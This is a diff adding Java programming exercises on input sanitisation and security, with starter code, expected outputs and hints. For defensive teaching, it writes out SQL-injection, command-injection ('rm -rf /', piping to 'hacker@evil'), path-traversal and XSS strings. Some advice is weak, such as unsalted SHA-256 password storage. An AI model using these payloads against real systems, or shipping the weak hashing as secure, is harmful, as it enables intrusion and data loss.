+          "description": "Convert < > & ' \" to safe HTML entities.",
+          "difficulty": "intermediate",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 5,
+          "ai_intro": "Order matters: escape & FIRST to avoid double-encoding.",
+          "starter_code": "public class Main {\n    static String escapeHtml(String input) {\n        // TODO: Replace & < > \" ' with HTML entities\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(escapeHtml(\"<script>alert('hi')</script>\"));\n        System.out.println(escapeHtml(\"5 > 3 && 2 < 4\"));\n    }\n}",
+          "expected_output": "&lt;script&gt;alert(&#39;hi&#39;)&lt;/script&gt;\n5 &gt; 3 &amp;&amp; 2 &lt; 4",
+          "hints": [
+            {
+              "message": "Replace & first! Then < > \" '."
+            },
+            {
+              "message": ".replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").replace(\"\\\"\",\"&quot;\").replace(\"'\",\"&#39;\")"
+            },
+            {
+              "message": "static String escapeHtml(String i){if(i==null)return\"\";return i.replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").replace(\"\\\"\",\"&quot;\").replace(\"'\",\"&#39;\");}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: SQL Injection Simulation",
+          "description": "Show how string concatenation enables injection.",
+          "difficulty": "intermediate",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 5,
+          "ai_intro": "This is how real attacks work!",
+          "starter_code": "public class Main {\n    static String unsafeQuery(String user) {\n        return \"SELECT * FROM users WHERE name = '\" + user + \"'\";\n    }\n    public static void main(String[] args) {\n        System.out.println(\"Normal:\");\n        System.out.println(unsafeQuery(\"alice\"));\n        System.out.println(\"\\nAttack 1:\");\n        System.out.println(unsafeQuery(\"admin' OR '1'='1\"));\n        System.out.println(\"\\nAttack 2:\");\n        System.out.println(unsafeQuery(\"'; DROP TABLE users; --\"));\n        // TODO: Write safeQuery that escapes single quotes\n    }\n}",
+          "expected_output": "Normal:\nSELECT * FROM users WHERE name = 'alice'\n\nAttack 1:\nSELECT * FROM users WHERE name = 'admin' OR '1'='1'\n\nAttack 2:\nSELECT * FROM users WHERE name = ''; DROP TABLE users; --'\n\nSafe:\nSELECT * FROM users WHERE name = 'admin'' OR ''1''=''1'",
+          "hints": [
+            {
+              "message": "static String safeQuery(String user){return \"SELECT * FROM users WHERE name = '\"+user.replace(\"'\",\"''\")+\"'\";}"
+            },
+            {
+              "message": "Doubling single quotes makes them literal text, not SQL terminators."
+            },
+            {
+              "message": "In real code: ALWAYS use PreparedStatement with ? parameters. Manual escaping is error-prone."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: Path Traversal Prevention",
+          "description": "Sanitise filenames to prevent directory traversal.",
+          "difficulty": "intermediate",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 5,
+          "ai_intro": "../ is the attacker's best friend for reading files.",
+          "starter_code": "public class Main {\n    static String safePath(String filename) {\n        // TODO: Remove .., /, \\, null bytes. Only allow [a-zA-Z0-9._-]\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(safePath(\"report.pdf\"));\n        System.out.println(safePath(\"../../../etc/passwd\"));\n        System.out.println(safePath(\"file<script>.txt\"));\n        System.out.println(safePath(null));\n    }\n}",
+          "expected_output": "report.pdf\ndefault.txt\ndefault.txt\ndefault.txt",
+          "hints": [
+            {
+              "message": "Remove /, \\, and .. first. Then validate with regex."
+            },
+            {
+              "message": "if(!clean.matches(\"[a-zA-Z0-9._-]+\")) return \"default.txt\";"
+            },
+            {
+              "message": "static String safePath(String f){if(f==null||f.trim().isEmpty())return\"default.txt\";String c=f.replace(\"/\",\"\").replace(\"\\\\\",\"\").replace(\"..\",\"\");if(!c.matches(\"[a-zA-Z0-9._-]+\")||c.isEmpty())return\"default.txt\";return c;}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: Command Injection Prevention",
+          "description": "Sanitise input that might be used in system commands.",
+          "difficulty": "intermediate",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 5,
+          "ai_intro": "Never pass raw user input to system commands.",
+          "starter_code": "public class Main {\n    static String safeForCommand(String input) {\n        // TODO: Remove ; | & ` $ ( ) { } < > and other shell metacharacters\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(safeForCommand(\"myfile.txt\"));\n        System.out.println(safeForCommand(\"file; rm -rf /\"));\n        System.out.println(safeForCommand(\"$(cat /etc/passwd)\"));\n        System.out.println(safeForCommand(\"file | mail hacker@evil\"));\n    }\n}",
+          "expected_output": "myfile.txt\nfile rm -rf \n(cat /etc/passwd)\nfile  mail hacker@evil",
+          "hints": [
+            {
+              "message": "Use replaceAll to remove dangerous shell characters."
+            },
+            {
+              "message": "String clean = input.replaceAll(\"[;|&`${}()<>]\", \"\");"
+            },
+            {
+              "message": "static String safeForCommand(String input){if(input==null)return\"\";return input.replaceAll(\"[;|&`${}<>]\",\"\");}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: Detect Attack Patterns",
+          "description": "Scan input for common attack signatures.",
+          "difficulty": "intermediate",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 5,
+          "ai_intro": "Pattern detection as an early warning system.",
+          "starter_code": "public class Main {\n    static String detectThreat(String input) {\n        if (input == null) return \"NULL\";\n        String upper = input.toUpperCase();\n        // TODO: Check for SQL, XSS, path traversal patterns\n        // Return threat type or \"SAFE\"\n        return \"SAFE\";\n    }\n    public static void main(String[] args) {\n        System.out.println(detectThreat(\"Hello World\"));\n        System.out.println(detectThreat(\"admin' OR '1'='1\"));\n        System.out.println(detectThreat(\"<script>alert(1)</script>\"));\n        System.out.println(detectThreat(\"../../../etc/passwd\"));\n        System.out.println(detectThreat(\"SELECT * FROM users\"));\n    }\n}",
+          "expected_output": "SAFE\nSQL_INJECTION\nXSS\nPATH_TRAVERSAL\nSQL_INJECTION",
+          "hints": [
+            {
+              "message": "Check for SQL keywords: UNION, SELECT, DROP, OR '"
+            },
+            {
+              "message": "Check for XSS: <script, onerror=, javascript:"
+            },
+            {
+              "message": "static String detectThreat(String i){if(i==null)return\"NULL\";String u=i.toUpperCase();if(u.contains(\"SELECT\")||u.contains(\"UNION\")||u.contains(\"DROP\")||i.contains(\"' OR\"))return\"SQL_INJECTION\";if(i.contains(\"<script\")||i.contains(\"onerror\")||i.contains(\"javascript:\"))return\"XSS\";if(i.contains(\"../\")||i.contains(\"..\\\\\"))return\"PATH_TRAVERSAL\";return\"SAFE\";}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Constant-Time String Comparison",
+          "description": "Prevent timing attacks on password comparison.",
+          "difficulty": "advanced",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 6,
+          "ai_intro": "Regular equals returns fast on first wrong char. Timing attack!",
+          "starter_code": "import java.security.MessageDigest;\n\npublic class Main {\n    // Regular equals (VULNERABLE to timing attack)\n    static boolean unsafeCompare(String a, String b) {\n        return a.equals(b);\n    }\n    // TODO: Constant-time compare (SAFE)\n    static boolean safeCompare(String a, String b) {\n        // Compare ALL characters even if mismatch found\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(safeCompare(\"secret\", \"secret\"));  // true\n        System.out.println(safeCompare(\"secret\", \"secrat\"));  // false\n        System.out.println(safeCompare(\"abc\", \"abcd\"));       // false\n    }\n}",
+          "expected_output": "true\nfalse\nfalse",
+          "hints": [
+            {
+              "message": "If lengths differ, still process all chars (pad shorter)."
+            },
+            {
+              "message": "int result=a.length()^b.length(); for(int i=0;i<Math.max(...);i++) result|=..."
+            },
+            {
+              "message": "static boolean safeCompare(String a,String b){if(a==null||b==null)return false;int result=a.length()^b.length();int max=Math.max(a.length(),b.length());for(int i=0;i<max;i++){char ca=i<a.length()?a.charAt(i):0;char cb=i<b.length()?b.charAt(i):0;result|=ca^cb;}return result==0;}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: Input Length Limiting",
+          "description": "Prevent buffer overflow with length limits.",
+          "difficulty": "beginner",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 3,
+          "ai_intro": "Never accept unlimited length input.",
+          "starter_code": "public class Main {\n    static String limitLength(String input, int maxLen) {\n        // TODO: Truncate if too long, add ... indicator\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(limitLength(\"Short\", 20));\n        System.out.println(limitLength(\"This is a very long string that exceeds the limit\", 20));\n        System.out.println(limitLength(null, 20));\n    }\n}",
+          "expected_output": "Short\nThis is a very lo...\n(empty)",
+          "hints": [
+            {
+              "message": "if(input.length() <= maxLen) return input;"
+            },
+            {
+              "message": "return input.substring(0, maxLen-3) + \"...\";"
+            },
+            {
+              "message": "static String limitLength(String input,int max){if(input==null)return\"\";if(input.length()<=max)return input;return input.substring(0,max-3)+\"...\";}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Credit Card Masking",
+          "description": "Hide all but last 4 digits of card numbers.",
+          "difficulty": "intermediate",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 4,
+          "ai_intro": "Never display or log full card numbers.",
+          "starter_code": "public class Main {\n    static String maskCard(String card) {\n        // TODO: Replace all but last 4 digits with *\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(maskCard(\"4521876512349876\"));\n        System.out.println(maskCard(\"4521-8765-1234-9876\"));\n    }\n}",
+          "expected_output": "************9876\n****-****-****-9876",
+          "hints": [
+            {
+              "message": "Get last 4 characters. Replace digits before them with *."
+            },
+            {
+              "message": "For plain: \"*\".repeat(card.length()-4) + card.substring(card.length()-4)"
+            },
+            {
+              "message": "static String maskCard(String card){if(card==null||card.length()<4)return\"****\";StringBuilder sb=new StringBuilder();for(int i=0;i<card.length()-4;i++){char c=card.charAt(i);sb.append(Character.isDigit(c)?'*':c);}sb.append(card.substring(card.length()-4));return sb.toString();}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Full Sanitisation Pipeline",
+          "description": "Validate, sanitise, and escape user comment.",
+          "difficulty": "advanced",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 7,
+          "ai_intro": "Defence in depth: multiple layers of protection.",
+          "starter_code": "public class Main {\n    static String processComment(String raw) {\n        // TODO: Step 1: Validate (not null, not empty, max 500 chars)\n        // Step 2: Trim whitespace\n        // Step 3: Strip HTML tags\n        // Step 4: Escape remaining special chars for display\n        // Return processed string or \"REJECTED\"\n        return \"REJECTED\";\n    }\n    public static void main(String[] args) {\n        System.out.println(processComment(\"Nice article!\"));\n        System.out.println(processComment(\"<script>alert('XSS')</script> Great!\"));\n        System.out.println(processComment(null));\n        System.out.println(processComment(\"\"));\n    }\n}",
+          "expected_output": "Nice article!\nalert(&#39;XSS&#39;) Great!\nREJECTED\nREJECTED",
+          "hints": [
+            {
+              "message": "Step 1: if(raw==null || raw.trim().isEmpty() || raw.length()>500) return \"REJECTED\";"
+            },
+            {
+              "message": "Step 2-3: String clean = raw.trim().replaceAll(\"<[^>]*>\",\"\");"
+            },
+            {
+              "message": "Step 4: return clean.replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").replace(\"'\",\"&#39;\").replace(\"\\\"\",\"&quot;\");"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Password Hashing",
+          "description": "Hash passwords with SHA-256.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 7,
+          "ai_intro": "NEVER store plain text passwords.",
+          "starter_code": "import java.security.MessageDigest;\n\npublic class Main {\n    static String hash(String password) {\n        // TODO: SHA-256 hash, return hex string\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(hash(\"password123\"));\n        System.out.println(hash(\"password123\")); // same input = same hash\n        System.out.println(hash(\"password124\")); // tiny change = totally different hash\n    }\n}",
+          "expected_output": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f\nef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f\n(different hash)",
+          "hints": [
+            {
+              "message": "MessageDigest md = MessageDigest.getInstance(\"SHA-256\"); byte[] hash=md.digest(pw.getBytes());"
+            },
+            {
+              "message": "StringBuilder sb=new StringBuilder(); for(byte b:hash) sb.append(String.format(\"%02x\",b));"
+            },
+            {
+              "message": "static String hash(String pw){try{MessageDigest md=MessageDigest.getInstance(\"SHA-256\");byte[] h=md.digest(pw.getBytes());StringBuilder sb=new StringBuilder();for(byte b:h)sb.append(String.format(\"%02x\",b));return sb.toString();}catch(Exception e){return\"\";}}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: Token Generator",
+          "description": "Generate random secure tokens.",
+          "difficulty": "intermediate",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 5,
+          "ai_intro": "Used for session IDs, API keys, password resets.",
+          "starter_code": "import java.security.SecureRandom;\n\npublic class Main {\n    static String generateToken(int length) {\n        // TODO: Generate random hex token of specified length\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(\"Token: \" + generateToken(32));\n        System.out.println(\"Short: \" + generateToken(16));\n        System.out.println(\"Tokens differ: \" + !generateToken(32).equals(generateToken(32)));\n    }\n}",
+          "expected_output": "Token: (32 random hex chars)\nShort: (16 random hex chars)\nTokens differ: true",
+          "hints": [
+            {
+              "message": "SecureRandom random = new SecureRandom(); byte[] bytes = new byte[length/2];"
+            },
+            {
+              "message": "random.nextBytes(bytes); then convert each byte to 2-char hex."
+            },
+            {
+              "message": "static String generateToken(int len){SecureRandom r=new SecureRandom();byte[] b=new byte[len/2];r.nextBytes(b);StringBuilder sb=new StringBuilder();for(byte x:b)sb.append(String.format(\"%02x\",x));return sb.toString();}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: URL Encoder",
+          "description": "Encode special characters in URL parameters.",
+          "difficulty": "intermediate",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 5,
+          "ai_intro": "Spaces and special chars must be encoded in URLs.",
+          "starter_code": "public class Main {\n    static String encodeParam(String input) {\n        // TODO: Replace space->+, &->%26, =->%3D, ?->%3F\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(encodeParam(\"hello world\"));\n        System.out.println(encodeParam(\"name=Alice&age=25\"));\n        System.out.println(encodeParam(\"search?q=java programming\"));\n    }\n}",
+          "expected_output": "hello+world\nname%3DAlice%26age%3D25\nsearch%3Fq%3Djava+programming",
+          "hints": [
+            {
+              "message": ".replace(\" \",\"+\") handles spaces."
+            },
+            {
+              "message": ".replace(\"&\",\"%26\").replace(\"=\",\"%3D\").replace(\"?\",\"%3F\")"
+            },
+            {
+              "message": "static String encodeParam(String i){if(i==null)return\"\";return i.replace(\" \",\"+\").replace(\"&\",\"%26\").replace(\"=\",\"%3D\").replace(\"?\",\"%3F\");}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: Log Sanitiser",
+          "description": "Clean sensitive data from log messages.",
+          "difficulty": "intermediate",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 5,
+          "ai_intro": "Logs must not contain passwords, tokens, or card numbers.",
+          "starter_code": "public class Main {\n    static String sanitiseLog(String logLine) {\n        // TODO: Mask passwords, card numbers, emails in log\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(sanitiseLog(\"User login password=secret123 at 14:00\"));\n        System.out.println(sanitiseLog(\"Payment card=4521876512349876 amount=99.99\"));\n        System.out.println(sanitiseLog(\"Email sent to alice@company.com status=OK\"));\n    }\n}",
+          "expected_output": "User login password=*** at 14:00\nPayment card=************9876 amount=99.99\nEmail sent to a***@company.com status=OK",
+          "hints": [
+            {
+              "message": "Use replaceAll with regex: replaceAll(\"password=[^\\\\s]+\", \"password=***\")"
+            },
+            {
+              "message": "Card: find 16 consecutive digits, mask first 12."
+            },
+            {
+              "message": "static String sanitiseLog(String l){if(l==null)return\"\";String r=l.replaceAll(\"password=[^\\\\s]+\",\"password=***\");r=r.replaceAll(\"(\\\\d{12})(\\\\d{4})\",\"************$2\");r=r.replaceAll(\"([a-zA-Z])[a-zA-Z.]*@\",\"$1***@\");return r;}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Palindrome Checker",
+          "description": "Check if text is a palindrome (ignoring case and spaces).",
+          "difficulty": "beginner",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 4,
+          "ai_intro": "Clean the string first, then compare with reverse.",
+          "starter_code": "public class Main {\n    static boolean isPalindrome(String text) {\n        // TODO: Ignore case, spaces, and punctuation\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(isPalindrome(\"racecar\"));           // true\n        System.out.println(isPalindrome(\"A man a plan a canal Panama\")); // true\n        System.out.println(isPalindrome(\"hello\"));             // false\n        System.out.println(isPalindrome(\"Was it a car or a cat I saw\"));  // true\n    }\n}",
+          "expected_output": "true\ntrue\nfalse\ntrue",
+          "hints": [
+            {
+              "message": "Clean: remove non-letters, lowercase. Then compare with reverse."
+            },
+            {
+              "message": "String clean = text.replaceAll(\"[^a-zA-Z]\",\"\").toLowerCase();"
+            },
+            {
+              "message": "static boolean isPalindrome(String t){String c=t.replaceAll(\"[^a-zA-Z]\",\"\").toLowerCase();return c.equals(new StringBuilder(c).reverse().toString());}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: Caesar Cipher",
+          "description": "Encrypt and decrypt messages with character shifting.",
+          "difficulty": "intermediate",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 6,
+          "ai_intro": "Shift each letter by N positions, wrapping around z->a.",
+          "starter_code": "public class Main {\n    static String cipher(String text, int shift) {\n        // TODO: Shift each letter by shift positions, preserve case\n        return \"\";\n    }\n    public static void main(String[] args) {\n        String encrypted = cipher(\"Hello World\", 3);\n        System.out.println(\"Encrypted: \" + encrypted);\n        System.out.println(\"Decrypted: \" + cipher(encrypted, -3));\n    }\n}",
+          "expected_output": "Encrypted: Khoor Zruog\nDecrypted: Hello World",
+          "hints": [
+            {
+              "message": "For each char: if letter, shift. Otherwise keep as-is."
+            },
+            {
+              "message": "char shifted = (char)('a' + (c - 'a' + shift + 26) % 26); for lowercase."
+            },
+            {
+              "message": "static String cipher(String t,int s){StringBuilder sb=new StringBuilder();for(char c:t.toCharArray()){if(Character.isLowerCase(c))sb.append((char)('a'+(c-'a'+s%26+26)%26));else if(Character.isUpperCase(c))sb.append((char)('A'+(c-'A'+s%26+26)%26));else sb.append(c);}return sb.toString();}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: JSON Builder",
+          "description": "Build a JSON string from Java data.",
+          "difficulty": "intermediate",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 6,
+          "ai_intro": "APIs communicate using JSON strings.",
+          "starter_code": "public class Main {\n    static String toJson(String name, int age, String city) {\n        // TODO: Build JSON: {\"name\":\"Alice\",\"age\":25,\"city\":\"London\"}\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(toJson(\"Alice\", 25, \"London\"));\n        System.out.println(toJson(\"Bob\", 30, \"Paris\"));\n    }\n}",
+          "expected_output": "{\"name\":\"Alice\",\"age\":25,\"city\":\"London\"}\n{\"name\":\"Bob\",\"age\":30,\"city\":\"Paris\"}",
+          "hints": [
+            {
+              "message": "Use StringBuilder or String.format."
+            },
+            {
+              "message": "String.format('{\"name\":\"%s\",\"age\":%d,\"city\":\"%s\"}', name, age, city)"
+            },
+            {
+              "message": "static String toJson(String n,int a,String c){return String.format(\"{\\\"name\\\":\\\"%s\\\",\\\"age\\\":%d,\\\"city\\\":\\\"%s\\\"}\",n,a,c);}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Redact Sensitive Data",
+          "description": "Replace sensitive patterns with [REDACTED].",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 6,
+          "ai_intro": "Data protection: hide personal info before sharing.",
+          "starter_code": "public class Main {\n    static String redact(String text) {\n        // TODO: Redact emails, phone numbers, and credit card numbers\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(redact(\"Contact alice@email.com or 07700123456\"));\n        System.out.println(redact(\"Card: 4521-8765-1234-9876 expires 12/25\"));\n    }\n}",
+          "expected_output": "Contact [EMAIL] or [PHONE]\nCard: [CARD] expires 12/25",
+          "hints": [
+            {
+              "message": "Use replaceAll with regex for each pattern."
+            },
+            {
+              "message": "Email: replaceAll(\"[a-zA-Z0-9.]+@[a-zA-Z0-9.]+\",\"[EMAIL]\")"
+            },
+            {
+              "message": "static String redact(String t){if(t==null)return\"\";String r=t.replaceAll(\"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}\",\"[EMAIL]\");r=r.replaceAll(\"0\\\\d{10}\",\"[PHONE]\");r=r.replaceAll(\"\\\\d{4}[- ]?\\\\d{4}[- ]?\\\\d{4}[- ]?\\\\d{4}\",\"[CARD]\");return r;}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Text Analyser",
+          "description": "Complete text analysis tool.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Combine all string skills into one application.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String text = \"Java is a powerful language. Java is used everywhere. Strings in Java are immutable.\";\n        // TODO: Count words, sentences, average word length\n        // TODO: Find most common word\n        // TODO: Find longest word\n    }\n}",
+          "expected_output": "Words: 15\nSentences: 3\nAvg word length: 4.5\nMost common: Java (3 times)\nLongest: immutable (9 chars)",
+          "hints": [
+            {
+              "message": "String[] words = text.replaceAll(\"\\\\.\",\"\").split(\"\\\\s+\");"
+            },
+            {
+              "message": "Use HashMap<String,Integer> for word frequency count."
+            },
+            {
+              "message": "String[] words=text.replaceAll(\"[.]\",\"\").split(\"\\\\s+\");\nimport java.util.HashMap;\nHashMap<String,Integer> freq=new HashMap<>();\nString longest=\"\";\nfor(String w:words){freq.put(w,freq.getOrDefault(w,0)+1);if(w.length()>longest.length())longest=w;}\n// Find max freq, calculate avg length"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Secure Registration System",
+          "description": "Full registration with validation, sanitisation, and hashing.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 10,
+          "ai_intro": "Everything from this topic in one capstone exercise.",
+          "starter_code": "import java.security.MessageDigest;\nimport java.util.HashMap;\n\npublic class Main {\n    static HashMap<String,String> users = new HashMap<>();\n\n    // TODO: static boolean register(String username, String email, String password)\n    //   - Validate username (3-20, alphanumeric+underscore)\n    //   - Validate email (has @ and domain)\n    //   - Validate password (8+ chars, has upper+lower+digit+special)\n    //   - Sanitise username (trim, lowercase)\n    //   - Hash password (SHA-256)\n    //   - Store in users HashMap\n    //   - Return true if registered, false if validation fails or user exists\n\n    // TODO: static boolean login(String username, String password)\n\n    public static void main(String[] args) {\n        System.out.println(\"Register alice: \" + register(\"Alice\", \"alice@co.com\", \"Str0ng!Pass\"));\n        System.out.println(\"Register bob: \" + register(\"Bob_99\", \"bob@co.com\", \"weak\"));\n        System.out.println(\"Duplicate: \" + register(\"Alice\", \"a@b.com\", \"An0ther!Pass\"));\n        System.out.println(\"Login alice: \" + login(\"alice\", \"Str0ng!Pass\"));\n        System.out.println(\"Login wrong: \" + login(\"alice\", \"wrongpass\"));\n    }\n}",
+          "expected_output": "Register alice: true\nRegister bob: false\nDuplicate: false\nLogin alice: true\nLogin wrong: false",
+          "hints": [
+            {
+              "message": "Validate: check each field with the patterns from earlier exercises."
+            },
+            {
+              "message": "Sanitise: username.trim().toLowerCase(). Hash: SHA-256 on password."
+            },
+            {
+              "message": "static String hash(String p){try{MessageDigest m=MessageDigest.getInstance(\"SHA-256\");byte[]h=m.digest(p.getBytes());StringBuilder s=new StringBuilder();for(byte b:h)s.append(String.format(\"%02x\",b));return s.toString();}catch(Exception e){return\"\";}}\nstatic boolean register(String u,String e,String p){if(u==null||e==null||p==null)return false;String cu=u.trim().toLowerCase();if(cu.length()<3||cu.length()>20||!cu.matches(\"[a-z0-9_]+\"))return false;if(!e.contains(\"@\")||e.split(\"@\").length!=2)return false;boolean up=false,lo=false,di=false,sp=false;if(p.length()<8)return false;for(char c:p.toCharArray()){if(Character.isUpperCase(c))up=true;if(Character.isLowerCase(c))lo=true;if(Character.isDigit(c))di=true;if(!Character.isLetterOrDigit(c))sp=true;}if(!up||!lo||!di||!sp)return false;if(users.containsKey(cu))return false;users.put(cu,hash(p));return true;}\nstatic boolean login(String u,String p){String cu=u.trim().toLowerCase();return hash(p).equals(users.get(cu));}"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
